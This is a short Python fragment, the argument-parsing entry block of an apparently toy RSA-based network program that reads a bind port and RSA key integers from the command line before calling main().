	if len(sys.argv) != 5:
		usage_msg = f"Usage: python {sys.argv[0]} "
		usage_msg += "<<<bind port>>> "
		usage_msg += "<<<rsa priv key b>>> "
		usage_msg += "<<<rsa priv key a>>> "
		usage_msg += "<<<rsa publ key b>>> "
		print(usage_msg)
		exit(1)
	BIND_PORT = int(sys.argv[1])
	RSA_PRIV_KEY_B = int(sys.argv[2])
	RSA_PRIV_KEY_A = int(sys.argv[3])
	RSA_PUBL_KEY_B = int(sys.argv[4])
	RSA_PUBL_KEY_A = 65537
	main()

